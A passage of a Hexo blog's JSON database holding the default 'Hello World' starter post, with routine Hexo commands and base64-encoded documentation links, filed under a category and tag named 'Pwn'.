[Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"Pwn/hello-world","published":1,"date":"2023-11-04T07:03:08.914Z","updated":"2023-11-04T07:03:08.914Z","comments":1,"layout":"post","photos":[],"_id":"clojw0f900003g4ai8xkg5o1a","content":"<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n","excerpt":"","more":"<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clojw0f8q0001g4aihvkg496k","category_id":"clojpbdik0002z0ai9tgjhwtr","_id":"clojw0f920005g4ai7zxiavft"}],"PostTag":[{"post_id":"clojw0f8q0001g4aihvkg496k","tag_id":"clojpbdil0003z0aiep8zee6l","_id":"clojw0f920004g4ai3oz2etbq"}],"Tag":[{"name":"Pwn","_id":"clojpbdil0003z0aiep8zee6l"}]}}